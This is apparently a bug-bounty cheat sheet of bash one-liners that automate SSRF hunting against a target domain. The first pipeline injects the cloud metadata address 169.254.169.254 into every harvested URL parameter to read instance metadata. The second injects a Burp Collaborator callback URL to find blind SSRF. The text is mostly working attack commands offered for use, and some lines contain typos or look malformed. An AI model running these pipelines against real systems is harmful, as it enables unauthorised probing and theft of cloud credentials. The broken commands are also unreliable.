
## Accessing SSRF metadata with automation by just using curl and bash

### 1

**Command for getting URLs**
```bash
waybackurl target.com | tee wayback.txt
gau -subs target.com | tee gau-urls.txt

cat wayback.txt gau-urls.txt | sort -u |anew | httpx -silent | qsreplace 'http://169.254.169.254/latest/meta-data/hostname' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```
### 2
**Find Blind SSRF with automation by just using curl and bash**
```bash
waybaclurl target.com | tee wayback.txt
gau -subs target.com | tee gau-urls.txt

cat wayback.txt gau-urls.txt | sort -u | anew | httpx -silent | tee all-urls.txt
cat all-urls.txt | gf ssrf | tee ssrf.txt

# Finally we will use ffuf and burp collaboraotr client
cat ssrf.txt | qsreplace "YOUR BURP URL" | tee ssrf-fuzz.txt
ffuf -c ssrf-fuzz.txt -u FUZZ

```
